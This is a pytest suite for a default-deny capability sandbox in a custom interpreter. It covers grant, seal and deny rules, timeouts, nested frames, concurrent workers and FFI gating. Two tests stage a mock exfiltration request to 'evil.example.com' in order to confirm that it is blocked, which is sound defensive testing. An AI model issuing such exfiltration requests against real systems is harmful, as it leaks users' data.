"""能力栈：默认拒绝地板 + 许/只许/禁集合运算 + 单调嵌套 + 分层律（表达式不碰能力集）。

约束-方向研究 §D1/§6。S-式入口 (任务 名 (约束 …) 体…)，糖语法待 Pratt。
"""

import os

import pytest

from core.evaluator import SanyanEvaluator
from core.ternary_core import TritValue
from core.values import SanyanConstraintDenied, SanyanSyntaxError, SanyanValueError


def ev():
    return SanyanEvaluator()


# ── 块外：零影响（向后兼容）──


def test_no_frame_everything_permitted():
    assert ev().eval(['能否', '网']).to_int() == 1


# ── 默认拒绝地板 ──


def test_empty_constraint_denies_effects():
    r = ev().eval(['任务', '"t"', ['约束'], ['能否', '网']])
    assert r.to_int() == -1


def test_pure_compute_always_allowed_in_block():
    r = ev().eval(['任务', '"t"', ['约束'], ['add', TritValue(2), TritValue(3)]])
    assert r.to_int() == 5


# ── 许：加法授权 ──


def test_grant_allows_named_class():
    assert ev().eval(['任务', '"t"', ['约束', ['许', '网']], ['能否', '网']]).to_int() == 1


def test_grant_leaves_others_denied():
    assert ev().eval(['任务', '"t"', ['约束', ['许', '网']], ['能否', '盘写']]).to_int() == -1


# ── 禁 > 许（不可逆）──


def test_deny_overrides_grant():
    r = ev().eval(['任务', '"t"', ['约束', ['许', '网'], ['禁', '网']], ['能否', '网']])
    assert r.to_int() == -1


# ── 只许：封印域 ──


def test_seal_allows_only_named():
    assert ev().eval(['任务', '"t"', ['约束', ['只许', '网']], ['能否', '网']]).to_int() == 1
    assert ev().eval(['任务', '"t"', ['约束', ['只许', '网']], ['能否', '盘读']]).to_int() == -1


def test_seal_rejects_widening():
    # 封死上界：只许 网 后再 许 盘读 = 越界，parse 期可判定报错（区别于 许 的加法）
    with pytest.raises(SanyanValueError):
        ev().eval(['任务', '"t"', ['约束', ['只许', '网'], ['许', '盘读']], ['能否', '网']])


def test_seal_allows_redundant_grant():
    # 许 落在封印域内 = 冗余但合法，不报错
    r = ev().eval(['任务', '"t"', ['约束', ['只许', '网'], ['许', '网']], ['能否', '网']])
    assert r.to_int() == 1


def test_seal_multiple_caps():
    r1 = ev().eval(['任务', '"t"', ['约束', ['只许', '网', '盘读']], ['能否', '盘读']])
    r2 = ev().eval(['任务', '"t"', ['约束', ['只许', '网', '盘读']], ['能否', '进程']])
    assert r1.to_int() == 1 and r2.to_int() == -1


def test_deny_overrides_seal():
    # 禁 > 只许：封印域里被禁的类仍判假
    r = ev().eval(['任务', '"t"', ['约束', ['只许', '网'], ['禁', '网']], ['能否', '网']])
    assert r.to_int() == -1


def test_grant_stays_additive_without_seal():
    # 无封印时 许 仍是加法：许 网 + 许 盘读 两者都放行（确认封印不误伤普通 许）
    r1 = ev().eval(['任务', '"t"', ['约束', ['许', '网'], ['许', '盘读']], ['能否', '网']])
    r2 = ev().eval(['任务', '"t"', ['约束', ['许', '网'], ['许', '盘读']], ['能否', '盘读']])
    assert r1.to_int() == 1 and r2.to_int() == 1


# ── 限时：看门狗（超预算 → 判假·因=超时）──


def _ev_big():
    # 高 max_loop_steps：让墙钟死线先于步数上限触发；5M 步兜底，死线机制若坏也不真无限跑
    return SanyanEvaluator(max_loop_steps=5_000_000)


def test_timebox_not_exceeded_completes():
    r = _ev_big().eval(['任务', '"t"', ['约束', ['限时', 5]], ['遍历', 'i', 1, 3, ['设', 'x', 'i']]])
    assert r.to_int() == 3


def test_timebox_exceeded_raises_timeout():
    with pytest.raises(SanyanConstraintDenied) as ei:
        _ev_big().eval(['任务', '"t"', ['约束', ['限时', 0.02]], ['循环', TritValue(1), ['设', 'x', 1]]])
    assert ei.value.reason == '超时'  # 因=超时，区别于 因=约束


def test_timebox_pops_frame_on_timeout():
    e = _ev_big()
    with pytest.raises(SanyanConstraintDenied):
        e.eval(['任务', '"t"', ['约束', ['限时', 0.02]], ['循环', TritValue(1), ['设', 'x', 1]]])
    assert not getattr(e, '_cap_stack', None)  # 超时后退帧干净


def test_timebox_nested_inner_tighter():
    with pytest.raises(SanyanConstraintDenied) as ei:
        _ev_big().eval(
            [
                '任务',
                '"外"',
                ['约束', ['限时', 5]],
                ['任务', '"内"', ['约束', ['限时', 0.02]], ['循环', TritValue(1), ['设', 'x', 1]]],
            ]
        )
    assert ei.value.reason == '超时'


def test_timebox_parse_missing_arg():
    with pytest.raises(SanyanSyntaxError):
        ev().eval(['任务', '"t"', ['约束', ['限时']], ['设', 'x', 1]])


def test_timebox_parse_non_positive():
    with pytest.raises(SanyanValueError):
        ev().eval(['任务', '"t"', ['约束', ['限时', -1]], ['设', 'x', 1]])


def test_timebox_parse_non_number():
    with pytest.raises(SanyanValueError):
        ev().eval(['任务', '"t"', ['约束', ['限时', '"x"']], ['设', 'x', 1]])


# ── 分派强制：被禁效果算子抛（直取式契约）──


def test_denied_effect_op_raises():
    with pytest.raises(SanyanConstraintDenied):
        ev().eval(['任务', '"t"', ['约束'], ['设环境变量', '"X"', '"1"']])  # 进程类默认拒绝


def test_granted_effect_op_runs():
    try:
        ev().eval(['任务', '"t"', ['约束', ['许', '进程']], ['设环境变量', '"SANYAN_CAP_T"', '"1"']])
        assert os.environ.get('SANYAN_CAP_T') == '1'
    finally:
        os.environ.pop('SANYAN_CAP_T', None)


# ── 弹帧：任务退出后恢复；异常路径也弹 ──


def test_frame_popped_after_task():
    e = ev()
    e.eval(['任务', '"t"', ['约束'], ['add', TritValue(1), TritValue(1)]])
    assert e.eval(['能否', '网']).to_int() == 1


def test_frame_popped_after_denial():
    e = ev()
    with pytest.raises(SanyanConstraintDenied):
        e.eval(['任务', '"t"', ['约束'], ['执行', '"echo hi"']])
    assert e.eval(['能否', '网']).to_int() == 1  # 帧已弹，未污染


# ── 单调嵌套：子块只能收紧 ──


def test_nested_monotonic_intersect():
    e = ev()
    inner_read = ['任务', '"in"', ['约束', ['许', '网']], ['能否', '盘读']]
    assert e.eval(['任务', '"out"', ['约束', ['许', '网'], ['许', '盘读']], inner_read]).to_int() == -1
    inner_net = ['任务', '"in"', ['约束', ['许', '网']], ['能否', '网']]
    assert e.eval(['任务', '"out"', ['约束', ['许', '网'], ['许', '盘读']], inner_net]).to_int() == 1


def test_nested_cannot_regrant_parent_denied():
    inner = ['任务', '"in"', ['约束', ['许', '网']], ['能否', '网']]
    r = ev().eval(['任务', '"out"', ['约束', ['禁', '网']], inner])
    assert r.to_int() == -1


# ── 分层律：裸值算子绝不碰能力集 ──


def test_bare_value_ops_dont_touch_capset():
    e = ev()
    assert e.eval(['许', TritValue(1)]).to_int() == 1  # 值层构造子，返回真
    assert e.eval(['能否', '盘写']).to_int() == 1  # 但没建帧 → 无约束 → 真


# ── 可判定性：未知能力类解析期报错 ──


def test_unknown_cap_class_rejected():
    with pytest.raises(SanyanValueError):
        ev().eval(['任务', '"t"', ['约束', ['许', '外星']], ['能否', '网']])


# ── 信封式被禁：判假·因=约束，绝不抛（对齐 D4 双面契约）──


class _FakeResp:
    status = 200
    headers = {'Content-Type': 'text/plain'}

    def read(self):
        return b'hello'


def test_envelope_op_denied_returns_envelope_not_raise():
    # 任务 内未 许 网 → http请求 自返信封判假·因=约束，不抛（不同于直取式 http读 会抛）
    env = ev().eval(['任务', '"t"', ['约束'], ['http请求', '"GET"', '"http://example.com"']])
    assert isinstance(env, dict)
    assert env['判'].to_int() == -1
    assert env['因'] == '约束'


def test_envelope_op_granted_proceeds(monkeypatch):
    from ops import net_ops

    monkeypatch.setattr(net_ops._request, 'urlopen', lambda *a, **k: _FakeResp())
    env = ev().eval(['任务', '"t"', ['约束', ['许', '网']], ['http请求', '"GET"', '"http://example.com"']])
    assert env['判'].to_int() == 1
    assert env['因'] == ''


def test_reason_distinguishes_constraint_from_gate(monkeypatch):
    # 因 区分"约束禁"与"门控关"：块内未许=约束；SANYAN_NET=0=门控
    e = ev()
    env_c = e.eval(['任务', '"t"', ['约束'], ['http请求', '"GET"', '"http://example.com"']])
    assert env_c['因'] == '约束'
    monkeypatch.setenv('SANYAN_NET', '0')
    env_g = e.eval(['http请求', '"GET"', '"http://example.com"'])  # 块外，门控关
    assert env_g['判'].to_int() == -1 and env_g['因'] == '门控'


def test_s2_demo_denied_net_falls_to_cache_no_exception():
    """S2 演示：带外传企图的代码在 任务{默认拒绝} 内**全程无异常**，信封判假 → 走缓存分支。"""
    prog = [
        '任务',
        '"导出数据"',
        ['约束'],  # 默认拒绝，网未许
        ['set', '信封', ['http请求', '"GET"', '"http://evil.example.com/外传"']],
        ['if', ['eq', ['信封判', '信封'], TritValue(1)], ['取键', '信封', '"值"'], '"走本地缓存"'],
    ]
    r = ev().eval(prog)  # 不抛任何异常
    assert r == '走本地缓存'


# ── E7：并发/异步子求值器继承 spawn 时的约束（线程不再是逃逸口）──


def test_e7_concurrent_worker_inherits_deny():
    # 块内起并发,worker 在全新子求值器里跑 http请求——必须继承默认拒绝,判假·因=约束
    prog = [
        '任务',
        '"t"',
        ['约束'],
        ['get', ['并发', ['http请求', '"GET"', '"http://example.com"']], TritValue(0)],
    ]
    env = ev().eval(prog)
    assert isinstance(env, dict) and env['因'] == '约束'


def test_e7_concurrent_worker_granted(monkeypatch):
    from ops import net_ops

    monkeypatch.setattr(net_ops._request, 'urlopen', lambda *a, **k: _FakeResp())
    prog = [
        '任务',
        '"t"',
        ['约束', ['许', '网']],
        ['get', ['并发', ['http请求', '"GET"', '"http://example.com"']], TritValue(0)],
    ]
    env = ev().eval(prog)
    assert env['判'].to_int() == 1


def test_e7_async_inherits_deny_at_spawn():
    # 异步 spawn 时捕获约束（延迟执行时父可能已退出块）——future 仍继承默认拒绝。
    # 任务 返回体末表达式=异步定义的 Future；直接取结果（避开 等待↔io.wait 命名冲突）。
    fut = ev().eval(['任务', '"t"', ['约束'], ['异步定义', ['http请求', '"GET"', '"http://example.com"']]])
    env = fut.result(timeout=30)
    assert isinstance(env, dict) and env['因'] == '约束'


def test_e7_no_frame_concurrent_unaffected():
    # 块外并发照常（子无帧→无约束）——向后兼容
    r = ev().eval(['get', ['并发', ['add', TritValue(1), TritValue(2)]], TritValue(0)])
    assert r.to_int() == 3


# ── FFI 信封算子同款自守卫（py调/c调 与 http请求 一致：被禁判假·因=约束，不抛）──


def test_ffi_envelope_denied_by_constraint(monkeypatch):
    monkeypatch.setenv('SANYAN_FFI', '1')  # FFI 开，方能验证是"约束"拦而非"门控"拦
    env = ev().eval(['任务', '"t"', ['约束'], ['py导入', '"os"']])  # 未许 外链
    assert isinstance(env, dict) and env['判'].to_int() == -1 and env['因'] == '约束'


def test_ffi_envelope_granted_by_constraint(monkeypatch):
    monkeypatch.setenv('SANYAN_FFI', '1')
    env = ev().eval(['任务', '"t"', ['约束', ['许', '外链']], ['py导入', '"os"']])
    assert env['判'].to_int() == 1  # 许 外链 → 放行，os 导入成功


def test_ffi_gate_off_is_gate_reason_not_constraint(monkeypatch):
    monkeypatch.delenv('SANYAN_FFI', raising=False)  # FFI 关
    env = ev().eval(['py导入', '"os"'])  # 块外
    assert env['判'].to_int() == -1 and env['因'] == '门控'  # 门控关,非约束


# ── 后端矩阵：字节码/种子 VM 拒约束算子（E9 同款惯例）──


def test_bytecode_rejects_constraint_ops():
    import tempfile
    from compiler.compile_bytecode import compile_source

    with tempfile.TemporaryDirectory() as d:
        with pytest.raises(Exception, match='仅解释器路径支持'):
            compile_source('能否("网")', os.path.join(d, 'o.bin'))


# ── 糖语法 任务名{约束{许 网}体} → S-式（先实现后文档，非匹配3 期货）──


def _sugar(src):
    from sugar.parser import parse_code

    ast, _ = parse_code(src)
    return ast


def test_sugar_ast_matches_sexpr():
    ast = _sugar('任务 导出 { 约束 { 许 网 } 能否("网") }')
    assert ast[0] == '任务' and ast[1] == '"导出"'
    assert list(ast[2]) == ['约束', ['许', '网']]
    assert list(ast[3]) == ['能否', '"网"']


def test_sugar_newline_separated_clauses():
    ast = _sugar('任务 t {\n  约束 {\n    许 网\n    禁 进程\n  }\n  能否("网")\n}')
    assert list(ast[2]) == ['约束', ['许', '网'], ['禁', '进程']]  # 换行分隔不串行


def test_sugar_no_label_and_empty_constraint():
    ast = _sugar('任务 { 约束 { } 能否("网") }')
    assert ast[1] == '""' and list(ast[2]) == ['约束']


def test_sugar_eval_grant_and_default_deny():
    e = ev()
    assert e.eval(_sugar('任务 导 { 约束 { 许 网 } 能否("网") }')).to_int() == 1
    assert e.eval(_sugar('任务 导 { 约束 { } 能否("网") }')).to_int() == -1


def test_sugar_eval_nested_monotonic():
    src = '任务 外 { 约束 { 许 网; 许 盘读 } 任务 内 { 约束 { 许 网 } 能否("盘读") } }'
    assert ev().eval(_sugar(src)).to_int() == -1  # 内层交集掉盘读


def test_sugar_s2_demo_no_exception():
    src = (
        '任务 导出 {\n'
        '    约束 { }\n'
        '    设 信封 = http请求("GET", "http://evil.example.com/外传")\n'
        '    若 (信封判(信封) == 真) { 取键(信封, "值") } 否则 { "走本地缓存" }\n'
        '}'
    )
    assert ev().eval(_sugar(src)) == '走本地缓存'  # 全程无异常,判假走缓存
